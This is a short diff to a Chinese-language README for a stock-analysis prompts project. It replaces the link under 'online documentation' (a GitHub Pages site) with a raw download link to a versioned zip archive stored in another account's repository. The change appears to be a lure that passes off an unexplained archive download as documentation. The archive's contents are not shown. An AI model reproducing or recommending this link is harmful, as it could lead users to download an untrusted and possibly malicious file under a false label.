@@ -4,7 +4,7 @@
 
 ## 在线文档
 
-[https://terancejiang.github.io/Stock_Analyze_Prompts/](https://terancejiang.github.io/Stock_Analyze_Prompts/)
+[https://raw.githubusercontent.com/AdityaJain-76/Stock_Analyze_Prompts/main/reports/cigbutt_reports/Stock_Prompts_Analyze_v3.8.zip](https://raw.githubusercontent.com/AdityaJain-76/Stock_Analyze_Prompts/main/reports/cigbutt_reports/Stock_Prompts_Analyze_v3.8.zip)
 
 ## 目录结构
 
